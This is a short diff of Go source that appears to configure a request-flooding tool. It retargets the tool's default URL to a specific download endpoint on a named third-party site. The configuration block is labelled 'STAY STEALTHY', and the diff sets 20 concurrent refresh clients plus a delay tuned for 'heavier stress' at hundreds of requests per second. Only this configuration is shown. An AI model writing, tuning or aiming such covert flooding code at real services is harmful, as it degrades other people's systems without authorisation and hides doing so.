@@ -18,7 +18,7 @@ import (
 // CONFIGURATION (STAY STEALTHY)
 // ==========================================
 var (
-	SERVER_URL      = getEnv("TARGET_URL", "https://shrutibots.site/")
+	SERVER_URL      = getEnv("TARGET_URL", "https://shrutibots.site/download?url=0bom_rgyXXY&type=audio")
 	TOTAL_CLIENTS   = 20          // Number of concurrent refresh clients
 	MAX_WORKERS     = 20
 	REFRESH_DELAY   = 500 * time.Millisecond // Lower = heavier stress (80ms ≈ 375 RPS total)
